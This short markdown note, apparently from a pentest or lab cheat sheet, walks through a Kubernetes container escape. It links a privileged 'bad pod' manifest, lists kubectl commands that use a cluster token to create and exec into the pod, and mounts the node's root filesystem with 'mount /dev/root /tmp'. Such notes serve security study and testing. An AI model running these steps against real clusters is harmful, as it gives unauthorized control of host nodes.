# Container Escape

## Example:

### If we have admin access to the cluster, we can create any resources we want.

### We can create a "bad" pod that mounts the node's file system.

## EVERYTHING-ALLOWED-EXEC-POD: 

https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

## STEPS:

#### 1) Pull a container image (minikube's local docker registry) 

#### 2) Create the "bad" pod for privesc

    kubectl apply -f BAD_POD.yml --token={TOKEN} 

#### 3) Enumerate pods

    kubectl get pods --token={TOKEN}

#### 4) Run newly created "bad" pod for privesc

    kubectl exec -it BAD_POD --token={TOKEN} -- /bin/bash

## Breakout of the Kubernetes environment

After we created an ran our malicious pod, we can escape the Kubernetes environment by mounting the file system to the /tmp directory (example)

#### 1) Mount the file system to /tmp directory

    mount /dev/root /tmp

#### 2) Go to /tmp to escape!

    cd /tmp

#### 3) GGWP!
